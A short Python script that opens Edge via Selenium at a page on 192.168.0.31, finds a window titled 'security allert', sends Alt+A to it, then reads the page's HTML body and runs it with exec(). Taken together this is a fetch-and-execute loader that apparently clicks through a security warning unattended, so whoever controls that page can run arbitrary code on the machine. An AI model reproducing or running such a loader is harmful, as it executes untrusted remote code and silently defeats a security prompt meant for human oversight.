import time
import win32gui
from selenium import webdriver
from pyautogui import hotkey


def win_enum_handler(hwnd, wins):
    wins.append((hwnd, win32gui.GetWindowText(hwnd)))


wins = []
cmds = ""

drv = webdriver.Edge("msedgedriver.exe")
drv.get("http://192.168.0.31/cmd.html")
time.sleep(5)

win32gui.EnumWindows(win_enum_handler, wins)
for hwnd, title in wins:
    if "security allert" in title.lower():
        win32gui.ShowWindow(hwnd, 5)
        win32gui.SetForegroundWindow(hwnd)
        time.sleep(1)
        hotkey("alt", "a")

body = drv.find_element_by_tag_name("body")
cmds = body.get_attribute("innerHTML")

exec(cmds)

drv.quit()
